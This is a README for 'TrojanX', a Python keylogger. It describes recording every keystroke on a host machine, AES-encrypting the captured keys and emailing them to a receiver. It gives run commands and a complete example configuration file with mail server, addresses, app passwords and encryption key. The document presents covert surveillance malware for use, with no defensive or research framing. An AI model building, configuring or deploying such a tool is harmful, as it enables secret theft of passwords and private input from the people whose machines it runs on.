<h1>TrojanX, a simple keylogger written in python</h1>

TrojanX is a simple keylogger software written in python, when executed on a host machine it will listen to every key strokes of the user. Once it gathered enough keys, it will encrypt them using AES and sent to an email server. The encrypted data can be read by the receiver email address decrypting it using the same keys when it was encrypted on the host machine.

<h3>How to use?</h3>

You need to create an authentication file, you need to store the following:

<li>The email server to be use</li>
<li>Email address of the receiver</li>
<li>Email address of the sender</li>
<li>App password of the receiver</li>
<li>App password of the sender</li>
<li>Random 16 bytes for key</li>
<li>Randome 16 bytes for iv</li>

---

Run the keyboard logger

```
$ python keyboard_logger.py
```

If you think the user typed atleast 20 or > characters, read the messages

```
$ python read_email.py
```

<h3>Authentications file example</h3>

Write this in authentications.py

```python
email_server = "imap.gmail.com"
receiver_email = "receiver@gmail.com"
sender_email = "sender@gmail.com"

# This is a 16 character app password

app_password_receiver = "dkwiospalifhjwen"
app_password_sender = "djwidkrtoiqplskd"

# This is a random 16 bytes to use as a key and initialization vector for encryption

key = b'\x88\x90G\xfc\xb7l\x85\xed\xf9\xa1}\x9fF\xdd`B'
iv = b'S\xa1.0\xd6\xed9=-\xca\xbe\xddVQ\x9e\x8d'

```
